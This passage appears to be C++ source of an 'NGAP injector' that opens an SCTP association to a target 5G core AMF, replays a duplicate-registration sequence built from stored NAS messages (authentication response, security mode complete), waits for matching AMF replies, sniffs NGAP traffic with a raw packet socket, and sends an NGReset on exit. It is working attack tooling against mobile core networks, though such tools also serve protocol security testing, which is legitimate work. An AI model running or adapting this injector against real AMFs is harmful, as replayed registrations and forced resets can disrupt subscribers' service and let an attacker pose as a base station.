      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(authentication_response_hex)),
                      "UplinkNASTransport(AuthenticationResponse)",
                      inter_send_delay_ms,
                      "DownlinkNASTransport(AuthenticationRequest)",
                      wait_timeout_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(security_mode_complete_hex)),
                      "UplinkNASTransport(SecurityModeComplete)",
                      inter_send_delay_ms,
                      "DownlinkNASTransport(SecurityModeCommand)",
                      wait_timeout_ms});
      pdus.push_back({build_initial_context_setup_response(amf_id, ul_ran_id, 1, 1, "127.0.0.1", 1),
                      "InitialContextSetupResponse",
                      inter_send_delay_ms,
                      "InitialContextSetupRequest",
                      wait_timeout_ms});
      pdus.push_back({build_ue_radio_capability_info_indication(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(ue_radio_capability_hex)),
                      "UERadioCapabilityInfoIndication",
                      inter_send_delay_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(post_context_uplink_nas_hex_1)),
                      "UplinkNASTransport(PostContext#1)",
                      inter_send_delay_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(post_context_uplink_nas_hex_2)),
                      "UplinkNASTransport(PostContext#2)",
                      inter_send_delay_ms});

      injectable_ngap_pdu wait_for_dl_nas_after_context = {};
      wait_for_dl_nas_after_context.pdu = byte_buffer{byte_buffer::fallback_allocation_tag{}};
      wait_for_dl_nas_after_context.name = nullptr;
      wait_for_dl_nas_after_context.wait_for_amf_before_send = "DownlinkNASTransport(PostContext)";
      wait_for_dl_nas_after_context.amf_wait_timeout_ms = wait_timeout_ms;
      pdus.push_back(std::move(wait_for_dl_nas_after_context));

      pdus.push_back({build_pdu_session_resource_setup_response(amf_id,
                                                                ul_ran_id,
                                                                pdu_session_id,
                                                                teid,
                                                                transport_layer_address,
                                                                qfi),
                      "PDUSessionResourceSetupResponse",
                      inter_send_delay_ms,
                      "PDUSessionResourceSetupRequest",
                      wait_timeout_ms});
      pdus.push_back({build_uplink_nas_transport(amf_id, ul_ran_id, make_hex_byte_buffer_or_throw(final_uplink_nas_hex)),
                      "UplinkNASTransport(Final)",
                      inter_send_delay_ms});

      print_confirmation("DuplicateRegistrationReplayFlow", {{"Initial-RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                              {"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                              {"Uplink-RAN-UE-NGAP-ID", default_to_string(ul_ran_id)},
                                                              {"PLMN", plmn},
                                                              {"TAC", tac},
                                                              {"PDU-Session-ID", default_to_string(pdu_session_id)},
                                                              {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                              {"Response-TEID", default_to_string(teid)},
                                                              {"Response-TLA", transport_layer_address},
                                                              {"AMF-wait-timeout-ms", default_to_string(wait_timeout_ms)},
                                                              {"Total-gNB-PDUs", default_to_string(pdus.size())}});
      return pdus;
    }
  }

  return std::nullopt;
}

static void send_ngap_pdu(sctp_socket&            socket,
                          sockaddr_storage&       destination,
                          const byte_buffer&      pdu,
                          const char*             pdu_name,
                          const probe_config&     cfg)
{
  std::printf("NGAP injector: packed %s length=%zu bytes\n", pdu_name, static_cast<size_t>(pdu.length()));
  if (cfg.dump_pdu_hex) {
    std::printf("NGAP injector: packed %s hex=", pdu_name);
    dump_hex(pdu);
  }

  if (pdu.length() > network_gateway_sctp_mtu) {
    throw std::runtime_error(std::string("Packed ") + pdu_name + " exceeds SCTP gateway maximum PDU length");
  }

  std::array<uint8_t, network_gateway_sctp_mtu> send_buffer = {};
  span<const uint8_t>                            pdu_span    = to_span(pdu, send_buffer);
  const int bytes_sent = ::sctp_sendmsg(socket.fd().value(),
                                        pdu_span.data(),
                                        pdu_span.size(),
                                        reinterpret_cast<sockaddr*>(&destination),
                                        sockaddr_len(destination),
                                        htonl(NGAP_PPID),
                                        0,
                                        stream_no,
                                        0,
                                        0);
  if (bytes_sent < 0) {
    throw std::runtime_error(std::string("Failed to send ") + pdu_name + ": " + std::strerror(errno));
  }
  if (static_cast<size_t>(bytes_sent) != pdu.length()) {
    throw std::runtime_error(std::string("Partial ") + pdu_name + " send");
  }

  std::printf("NGAP injector: sent %s bytes=%d/%zu\n", pdu_name, bytes_sent, static_cast<size_t>(pdu.length()));
}

static std::string expected_ngap_type_from_label(const std::string& expected)
{
  auto value = expected;
  const auto paren_pos = value.find('(');
  if (paren_pos != std::string::npos) {
    value.resize(paren_pos);
  }
  const auto space_pos = value.find(' ');
  if (space_pos != std::string::npos) {
    value.resize(space_pos);
  }
  return trim_copy(value);
}

static bool wait_for_amf_message(sctp_socket& socket, const std::string& expected, int timeout_ms, const probe_config& cfg)
{
  if (expected.empty()) {
    return true;
  }

  const auto start         = std::chrono::steady_clock::now();
  const auto expected_type = expected_ngap_type_from_label(expected);
  std::printf("NGAP injector: waiting for AMF %s before next replay step\n", expected.c_str());

  while (true) {
    int remaining_ms = timeout_ms;
    if (timeout_ms >= 0) {
      const auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
      if (elapsed_ms >= timeout_ms) {
        throw std::runtime_error("Timed out waiting for AMF " + expected);
      }
      remaining_ms = timeout_ms - static_cast<int>(elapsed_ms);
    }

    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(socket.fd().value(), &read_fds);

    timeval timeout = {};
    timeout.tv_sec  = remaining_ms / 1000;
    timeout.tv_usec = (remaining_ms % 1000) * 1000;

    const int ready = ::select(socket.fd().value() + 1, &read_fds, nullptr, nullptr, timeout_ms < 0 ? nullptr : &timeout);
    if (ready < 0) {
      throw std::runtime_error(std::string("Failed while waiting for AMF message: ") + std::strerror(errno));
    }
    if (ready == 0) {
      throw std::runtime_error("Timed out waiting for AMF " + expected);
    }

    std::array<uint8_t, network_gateway_sctp_mtu> recv_buffer = {};
    sctp_sndrcvinfo                               sndrcv_info = {};
    int                                           msg_flags   = 0;
    const ssize_t bytes_received = ::sctp_recvmsg(socket.fd().value(),
                                                  recv_buffer.data(),
                                                  recv_buffer.size(),
                                                  nullptr,
                                                  nullptr,
                                                  &sndrcv_info,
                                                  &msg_flags);
    if (bytes_received < 0) {
      throw std::runtime_error(std::string("Failed to receive AMF message: ") + std::strerror(errno));
    }
    if (bytes_received == 0) {
      throw std::runtime_error("AMF closed SCTP association while waiting for " + expected);
    }
    if ((msg_flags & MSG_NOTIFICATION) != 0) {
      std::printf("NGAP injector: ignored SCTP notification while waiting for AMF %s\n", expected.c_str());
      continue;
    }

    byte_buffer pdu{byte_buffer::fallback_allocation_tag{},
                    span<const uint8_t>{recv_buffer.data(), static_cast<size_t>(bytes_received)}};
    const std::string decoded = describe_ngap_pdu(pdu);
    if (decoded == "decode-failed") {
      std::printf("NGAP injector: ignored non-decodable AMF DATA while waiting for %s length=%zd\n",
                  expected.c_str(),
                  bytes_received);
      continue;
    }

    std::printf("NGAP injector: received AMF candidate while waiting for %s length=%zd decoded=%s stream=%u ppid=%u\n",
                expected.c_str(),
                bytes_received,
                decoded.c_str(),
                sndrcv_info.sinfo_stream,
                ntohl(sndrcv_info.sinfo_ppid));
    if (cfg.dump_pdu_hex) {
      std::printf("NGAP injector: received AMF hex=");
      dump_hex(pdu);
    }
    if (decoded != expected_type) {
      std::printf("NGAP injector: ignored AMF %s while waiting for %s\n", decoded.c_str(), expected_type.c_str());
      continue;
    }
    if (is_downlink_nas_authentication_reject(pdu)) {
      std::printf("NGAP injector: received NAS Authentication Reject; aborting current replay sequence\n");
      return false;
    }
    std::printf("NGAP injector: matched AMF %s; continuing replay\n", decoded.c_str());
    return true;
  }
}

class passive_ngap_capture
{
public:
  ~passive_ngap_capture() { stop(); }

  void start(const std::vector<sockaddr_storage>& amf_addresses, const std::string& interface_name, bool dump_hex_enabled)
  {
    for (const auto& address : amf_addresses) {
      if (reinterpret_cast<const sockaddr*>(&address)->sa_family == AF_INET) {
        amf_ipv4_addresses.push_back(reinterpret_cast<const sockaddr_in*>(&address)->sin_addr.s_addr);
      }
    }
    if (amf_ipv4_addresses.empty()) {
      throw std::runtime_error("Passive NGAP capture currently requires an IPv4 AMF address");
    }

    capture_fd = ::socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (capture_fd < 0) {
      throw std::runtime_error(std::string("Failed to create passive capture socket: ") + std::strerror(errno) +
                               " (root or CAP_NET_RAW is required)");
    }

    if (!interface_name.empty() && interface_name != "auto") {
      const unsigned if_index = if_nametoindex(interface_name.c_str());
      if (if_index == 0) {
        const std::string error = std::strerror(errno);
        ::close(capture_fd);
        capture_fd = -1;
        throw std::runtime_error("Failed to resolve capture interface " + interface_name + ": " + error);
      }
      sockaddr_ll bind_address = {};
      bind_address.sll_family   = AF_PACKET;
      bind_address.sll_protocol = htons(ETH_P_ALL);
      bind_address.sll_ifindex  = static_cast<int>(if_index);
      if (::bind(capture_fd, reinterpret_cast<sockaddr*>(&bind_address), sizeof(bind_address)) != 0) {
        const std::string error = std::strerror(errno);
        ::close(capture_fd);
        capture_fd = -1;
        throw std::runtime_error("Failed to bind passive capture interface " + interface_name + ": " + error);
      }
    }

    dump_hex_enabled_ = dump_hex_enabled;
    stop_requested     = false;
    worker             = std::thread([this]() { capture_loop(); });
    std::printf("NGAP injector: passive NGAP inspection enabled%s\n",
                interface_name.empty() || interface_name == "auto" ? " on all interfaces" : (" on " + interface_name).c_str());
  }

  void stop()
  {
    stop_requested = true;
    if (capture_fd >= 0) {
      ::shutdown(capture_fd, SHUT_RDWR);
    }
    if (worker.joinable()) {
      worker.join();
    }
    if (capture_fd >= 0) {
      ::close(capture_fd);
      capture_fd = -1;
    }
  }

private:
  static bool is_amf_address(uint32_t address, const std::vector<uint32_t>& amf_addresses)
  {
    return std::find(amf_addresses.begin(), amf_addresses.end(), address) != amf_addresses.end();
  }

  static uint16_t read_u16(const uint8_t* data)
  {
    uint16_t value = 0;
    std::memcpy(&value, data, sizeof(value));
    return ntohs(value);
  }

  static uint32_t read_u32(const uint8_t* data)
  {
    uint32_t value = 0;
    std::memcpy(&value, data, sizeof(value));
    return ntohl(value);
  }

  static std::string ipv4_string(uint32_t address)
  {
    in_addr value = {};
    value.s_addr  = address;
    char text[INET_ADDRSTRLEN] = {};
    return ::inet_ntop(AF_INET, &value, text, sizeof(text)) == nullptr ? "unknown" : text;
  }

  bool is_duplicate_pdu(const std::string& direction, uint16_t source_port, uint16_t dest_port, unsigned stream, unsigned ppid, const byte_buffer& pdu)
  {
    const auto now = std::chrono::steady_clock::now();
    constexpr auto duplicate_window = std::chrono::milliseconds{100};
    for (auto it = recent_pdus.begin(); it != recent_pdus.end();) {
      if (now - it->second > duplicate_window) { it = recent_pdus.erase(it); } else { ++it; }
    }
    std::string key = direction + ":" + std::to_string(source_port) + ":" + std::to_string(dest_port) + ":" + std::to_string(stream) + ":" + std::to_string(ppid) + ":";
    key.reserve(key.size() + pdu.length());
    for (const uint8_t byte : pdu) { key.push_back(static_cast<char>(byte)); }
    if (recent_pdus.find(key) != recent_pdus.end()) { return true; }
    recent_pdus.emplace(std::move(key), now);
    return false;
  }

  static size_t ethernet_payload_offset(const uint8_t* packet, size_t length, uint16_t link_type, uint16_t& ether_type)
  {
    static_cast<void>(link_type);
    ether_type = 0;
    // AF_PACKET may expose raw IP, loopback, Ethernet, or VLAN framing.
    constexpr std::array<size_t, 7> candidate_offsets = {0, 4, 14, 18, 22, 26, 30};
    for (const size_t offset : candidate_offsets) {
      if (length < offset + sizeof(iphdr)) {
        continue;
      }
      const auto* ip = reinterpret_cast<const iphdr*>(packet + offset);
      const size_t ip_header_length = static_cast<size_t>(ip->ihl) * 4;
      if (ip->version == 4 && ip_header_length >= sizeof(iphdr) &&
          length >= offset + ip_header_length && ip->protocol == IPPROTO_SCTP) {
        ether_type = ETH_P_IP;
        return offset;
      }
    }
    return 0;
  }

  void inspect_packet(const uint8_t* packet, size_t length, uint16_t link_type)
  {
    uint16_t ether_type = 0;
    const size_t ip_offset = ethernet_payload_offset(packet, length, link_type, ether_type);
    if (ether_type != ETH_P_IP || length < ip_offset + sizeof(iphdr)) {
      return;
    }

    const auto* ip = reinterpret_cast<const iphdr*>(packet + ip_offset);
    const size_t ip_header_length = static_cast<size_t>(ip->ihl) * 4;
    if (ip->version != 4 || ip_header_length < sizeof(iphdr) || length < ip_offset + ip_header_length ||
        ip->protocol != IPPROTO_SCTP || (!is_amf_address(ip->saddr, amf_ipv4_addresses) &&
                                           !is_amf_address(ip->daddr, amf_ipv4_addresses))) {
      return;
    }

    const size_t sctp_offset = ip_offset + ip_header_length;
    if (length < sctp_offset + 12) {
      return;
    }
    const uint16_t source_port = read_u16(packet + sctp_offset);
    const uint16_t dest_port   = read_u16(packet + sctp_offset + 2);
    const std::string direction = is_amf_address(ip->saddr, amf_ipv4_addresses) ? "AMF->gNB" : "gNB->AMF";

    size_t chunk_offset = sctp_offset + 12;
    while (chunk_offset + 4 <= length) {
      const uint8_t chunk_type = packet[chunk_offset];
      const uint16_t chunk_length = read_u16(packet + chunk_offset + 2);
      if (chunk_length < 4 || chunk_offset + chunk_length > length) {
        return;
      }
      if (chunk_type == 0 && chunk_length >= 16) {
        const unsigned stream = read_u16(packet + chunk_offset + 8);
        const unsigned ppid   = read_u32(packet + chunk_offset + 12);
        if (ppid == NGAP_PPID) {
          const size_t payload_offset = chunk_offset + 16;
          const size_t payload_length = chunk_length - 16;
          byte_buffer pdu{byte_buffer::fallback_allocation_tag{},
                          span<const uint8_t>{packet + payload_offset, payload_length}};
          if (is_duplicate_pdu(direction, source_port, dest_port, stream, ppid, pdu)) {
            chunk_offset += (chunk_length + 3) & ~static_cast<size_t>(3);
            continue;
          }
          const std::string message_type = describe_ngap_pdu(pdu);
          std::printf("NGAP inspector: %s %s:%u -> %s:%u stream=%u ppid=%u length=%zu type=%s\n",
                      direction.c_str(),
                      ipv4_string(ip->saddr).c_str(),
                      source_port,
                      ipv4_string(ip->daddr).c_str(),
                      dest_port,
                      stream,
                      ppid,
                      payload_length,
                      message_type.c_str());
          if (const auto decoded_fields = format_relevant_ngap_fields(pdu); decoded_fields.has_value()) {
            std::printf("\033[1;36mNGAP inspector: relevant fields:\n%s\033[0m", decoded_fields->c_str());
          }
          if (dump_hex_enabled_) {
            std::printf("NGAP inspector: hex=");
            dump_hex(pdu);
          }
        }
      }
      chunk_offset += (chunk_length + 3) & ~static_cast<size_t>(3);
    }
  }

  void capture_loop()
  {
    std::array<uint8_t, 65536> packet = {};
    while (!stop_requested) {
      pollfd descriptor = {capture_fd, POLLIN, 0};
      const int result = ::poll(&descriptor, 1, 250);
      if (result <= 0) {
        continue;
      }
      sockaddr_ll packet_address = {};
      socklen_t   packet_address_length = sizeof(packet_address);
      const ssize_t bytes = ::recvfrom(capture_fd,
                                       packet.data(),
                                       packet.size(),
                                       0,
                                       reinterpret_cast<sockaddr*>(&packet_address),
                                       &packet_address_length);
      if (bytes > 0) {
        inspect_packet(packet.data(), static_cast<size_t>(bytes), packet_address.sll_hatype);
      }
    }
  }

  int                 capture_fd = -1;
  bool                dump_hex_enabled_ = true;
  std::atomic<bool>   stop_requested = false;
  std::thread         worker;
  std::vector<uint32_t> amf_ipv4_addresses;
  std::unordered_map<std::string, std::chrono::steady_clock::time_point> recent_pdus;
};

[[maybe_unused]] static probe_config parse_args(int argc, char** argv)
{
  probe_config cfg;
  CLI::App     app{"Send NG Setup Request and interactive UE Context Release Request packets to a target AMF over SCTP"};

  app.add_option("--amf-addr,--target", cfg.amf_addresses, "Target AMF address or hostname")
      ->required()
      ->expected(1, -1);
  app.add_option("--amf-port,--port", cfg.amf_port, "Target AMF SCTP port")->capture_default_str();
  app.add_option("--bind-addr", cfg.bind_addresses, "Local SCTP bind address")->expected(1, -1);
  app.add_option("--bind-port", cfg.bind_port, "Local SCTP source port; 0 lets the kernel choose")
      ->capture_default_str();
  app.add_option("--bind-interface", cfg.bind_interface, "Local interface for SO_BINDTODEVICE")->capture_default_str();
  app.add_option("--sctp-init-max-attempts", cfg.init_max_attempts, "SCTP INIT max attempts")
      ->capture_default_str();
  app.add_option("--sctp-max-init-timeo-ms", cfg.max_init_timeo_ms, "SCTP INIT max timeout in milliseconds")
      ->capture_default_str();
  app.add_flag("--inspect-ngap", cfg.inspect_ngap, "Passively inspect SCTP/NGAP packets involving the AMF address");
  app.add_option("--capture-interface", cfg.capture_interface, "Interface for passive capture; empty captures all interfaces");
  app.add_flag("--capture-hex", cfg.dump_capture_hex, "Also print raw hex for passively captured NGAP PDUs");
  app.add_flag_function("--no-hex", [&cfg](std::int64_t) { cfg.dump_pdu_hex = false; },
                        "Do not print the packed NGAP PDU hex dump");

  try {
    app.parse(argc, argv);
  } catch (const CLI::ParseError& e) {
    std::exit(app.exit(e));
  }

  if (cfg.bind_port < 0 || cfg.bind_port > 65535) {
    throw std::runtime_error("--bind-port must be in range 0..65535");
  }
  if (cfg.bind_port != 0 && cfg.bind_addresses.empty()) {
    throw std::runtime_error("--bind-port requires --bind-addr");
  }

  return cfg;
}

[[maybe_unused]] static int run_probe(const probe_config& cfg)
{
  auto& logger = ocudulog::fetch_basic_logger("SCTP-GW");

  current_gnb_id = static_cast<uint32_t>(read_uint64_or_default("gNB ID", default_gnb_id, max_default_gnb_id));
  current_ran_node_name = read_text_token_or_default("RAN node name", default_ran_node_name);
  std::printf("NGAP injector: using gNB ID=%u gNB ID bit length=%u sector ID=%u RAN node name=%s\n",
              current_gnb_id,
              static_cast<unsigned>(default_gnb_id_bit_len),
              static_cast<unsigned>(default_sector_id),
              current_ran_node_name.c_str());

  std::printf("NGAP injector: target=[%s]:%d bind=[%s]:%d bind_interface=%s ppid=%u stream=%u\n",
              join_strings(cfg.amf_addresses, ", ").c_str(),
              cfg.amf_port,
              cfg.bind_addresses.empty() ? "implicit" : join_strings(cfg.bind_addresses, ", ").c_str(),
              cfg.bind_port,
              cfg.bind_interface.c_str(),
              NGAP_PPID,
              stream_no);

  std::vector<sockaddr_storage> dest_addrs = resolve_sctp_addresses(cfg.amf_addresses, cfg.amf_port, logger);
  if (dest_addrs.empty()) {
    throw std::runtime_error("Failed to resolve any target AMF address");
  }

  std::vector<sockaddr_storage> bind_addrs;
  if (!cfg.bind_addresses.empty()) {
    bind_addrs = resolve_sctp_addresses(cfg.bind_addresses, cfg.bind_port, logger);
    if (bind_addrs.empty()) {
      throw std::runtime_error("Failed to resolve any local bind address");
    }
  }

  const int socket_family = !bind_addrs.empty() ? (has_ipv6_address(bind_addrs) ? AF_INET6 : AF_INET)
                                                : (has_ipv6_address(dest_addrs) ? AF_INET6 : AF_INET);
  keep_compatible_destinations(dest_addrs, socket_family);
  if (dest_addrs.empty()) {
    throw std::runtime_error("No target AMF address is compatible with the selected SCTP socket family");
  }

  sctp_socket_params params = {};
  params.if_name           = "N2-PROBE";
  params.ai_family         = socket_family;
  params.ai_socktype       = SOCK_SEQPACKET;
  params.init_max_attempts = cfg.init_max_attempts;
  params.max_init_timeo    = std::chrono::milliseconds{cfg.max_init_timeo_ms};
  params.nodelay           = true;

  expected<sctp_socket> socket_outcome = sctp_socket::create(params);
  if (!socket_outcome.has_value()) {
    throw std::runtime_error("Failed to create SCTP socket");
  }
  sctp_socket socket = std::move(socket_outcome.value());

  if (!bind_addrs.empty() && !socket.bindx(bind_addrs, cfg.bind_interface)) {
    throw std::runtime_error("Failed to bind SCTP socket");
  }

  sctp_assoc_t assoc_id = 0;
  std::printf("NGAP injector: connecting to %zu resolved AMF address(es)...\n", dest_addrs.size());
  if (!socket.connectx(dest_addrs, assoc_id) || assoc_id == 0) {
    throw std::runtime_error(std::string("Failed to connect SCTP association: ") + std::strerror(errno));
  }

  const auto bound_port     = socket.get_bound_port();
  const auto peer_addresses = get_peer_addresses(socket.fd().value(), assoc_id);
  std::printf("NGAP injector: SCTP connected fd=%d assoc_id=%d local=%s local_port=%s peer=[%s]\n",
              socket.fd().value(),
              static_cast<int>(assoc_id),
              get_local_endpoint(socket.fd().value()).c_str(),
              bound_port.has_value() ? std::to_string(bound_port.value()).c_str() : "unknown",
              peer_addresses.empty() ? "unknown" : join_strings(peer_addresses, ", ").c_str());

  passive_ngap_capture passive_capture;
  if (cfg.inspect_ngap) {
    passive_capture.start(dest_addrs,
                          cfg.capture_interface.empty() ? cfg.bind_interface : cfg.capture_interface,
                          cfg.dump_capture_hex);
  }

  std::printf("NGAP injector: SCTP association remains open; NGSetupRequest is not sent automatically, select menu option 1 to send it\n");
  while (true) {
    const auto injectable_pdus = read_injectable_ngap_pdus();
    if (!injectable_pdus.has_value()) {
      break;
    }

    bool abort_current_sequence = false;
    for (const auto& injectable_pdu : injectable_pdus.value()) {
      if (!wait_for_amf_message(socket, injectable_pdu.wait_for_amf_before_send, injectable_pdu.amf_wait_timeout_ms, cfg)) {
        abort_current_sequence = true;
        break;
      }
      if (injectable_pdu.wait_before_send_ms > 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds{injectable_pdu.wait_before_send_ms});
      }
      if (injectable_pdu.name == nullptr) {
        continue;
      }
      send_ngap_pdu(socket, dest_addrs.front(), injectable_pdu.pdu, injectable_pdu.name, cfg);
    }
    if (abort_current_sequence) {
      std::printf("NGAP injector: replay sequence aborted; returning to menu\n");
    }
  }

  std::printf("NGAP injector: sending NGReset before closing SCTP association\n");
  print_confirmation("NGReset", {{"gNB-ID", default_to_string(current_gnb_id)},
                                 {"RAN-Node-Name", current_ran_node_name},
                                 {"Reset-Type", "NG Interface Reset"},
                                 {"Cause", "radio-connection-with-ue-lost"}});
  send_ngap_pdu(socket, dest_addrs.front(), build_ng_reset(true, {}), "NGReset", cfg);

  const int eof_result =
      ::sctp_sendmsg(socket.fd().value(),
                     nullptr,
                     0,
                     reinterpret_cast<sockaddr*>(&dest_addrs.front()),
                     sockaddr_len(dest_addrs.front()),
                     htonl(NGAP_PPID),
                     SCTP_EOF,
                     stream_no,
                     0,
                     0);
  if (eof_result < 0) {
    std::printf("NGAP injector: warning: failed to send SCTP EOF during close: %s\n", std::strerror(errno));
  } else {
    std::printf("NGAP injector: sent SCTP EOF and closing socket\n");
  }

  passive_capture.stop();
  socket.close();
  return 0;
}

} // namespace

#ifndef NGAP_INJECTOR_EMBEDDED
int main(int argc, char** argv)
{
  ocudulog::init();

  try {
    return run_probe(parse_args(argc, argv));
  } catch (const std::exception& e) {
    std::fprintf(stderr, "ngap_injector error: %s\n", e.what());
    return 1;
  }

  return 0;
}
#endif
